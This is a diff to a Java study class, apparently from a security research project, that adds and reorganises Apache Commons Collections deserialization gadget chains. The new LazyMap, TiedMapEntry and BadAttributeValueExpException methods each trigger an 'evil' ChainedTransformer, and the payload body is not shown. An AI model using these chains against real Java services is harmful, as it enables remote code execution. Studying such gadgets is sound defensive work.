@@ -10,6 +10,7 @@ import org.apache.commons.collections.map.TransformedMap;
 import org.apache.commons.io.IOUtils;
 
 import javax.management.BadAttributeValueExpException;
+import javax.xml.crypto.dsig.Transform;
 import java.io.*;
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
@@ -100,12 +101,37 @@ public class ApacheCommonsCollectionsVuln {
         );
     }
 
-    public static void Vuln() {
+    public static void LazyMapVuln() {
+        try {
+            Transformer transformChain = new ChainedTransformer(evil_tf_chain);
+            Map<?, ?> innerMap = new HashMap<>();
+//            innerMap.put("1", "1");
+            Map<?, ?> lazyMap = LazyMap.decorate(innerMap, transformChain);
+            lazyMap.get('1');
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void TiedMapEntryVuln() {
+        try {
+            Transformer transformChain = new ChainedTransformer(evil_tf_chain);
+            Map<?, ?> innerMap = new HashMap<>();
+            Map<?, ?> lazyMap = LazyMap.decorate(innerMap, transformChain);
+            TiedMapEntry entry = new TiedMapEntry(lazyMap, "shaobao");
+            System.out.println(entry);
+            lazyMap.get('1');
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void BadAttributeValueExpExceptionVuln() {
         try {
             Transformer transformChain = new ChainedTransformer(evil_tf_chain);
 
-            Map innerMap = new HashMap();
-            Map lazyMap = LazyMap.decorate(innerMap, transformChain);
+            Map<?, ?> innerMap = new HashMap<>();
+            Map<?, ?> lazyMap = LazyMap.decorate(innerMap, transformChain);
             TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo233");
 
             BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
@@ -300,8 +326,10 @@ public class ApacheCommonsCollectionsVuln {
 //        InvokerTransformerMoreVuln();
 //        ChainedTransformerVuln();
 //        TransformedMapVuln();
-        AnnotationInvocationHandlerVuln();
-        Vuln();
+//        AnnotationInvocationHandlerVuln();
+        BadAttributeValueExpExceptionVuln();
+//        LazyMapVuln();
+//        TiedMapEntryVuln();
     }
 
 }
